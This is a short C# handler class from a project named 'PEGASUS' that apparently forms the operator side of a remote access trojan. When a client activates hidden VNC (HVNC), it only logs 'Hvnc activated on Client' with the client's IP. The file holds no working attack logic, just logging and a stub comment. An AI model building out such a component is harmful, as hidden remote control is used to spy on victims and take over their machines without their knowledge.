using PEGASUS.Diadyktio;
using PEGASUS.Metafora_Dedomenon;
using System;
using System.Drawing;

namespace PEGASUS.BytesInOut
{
    class HandleHVNC
    {
        public HandleHVNC(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                new HandleLogs().Addmsg($" Hvnc activated on Client {client.Ip}", Color.Purple);
                //switch page

            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg(ex.Message, Color.Red);
            }
        }
    }
}
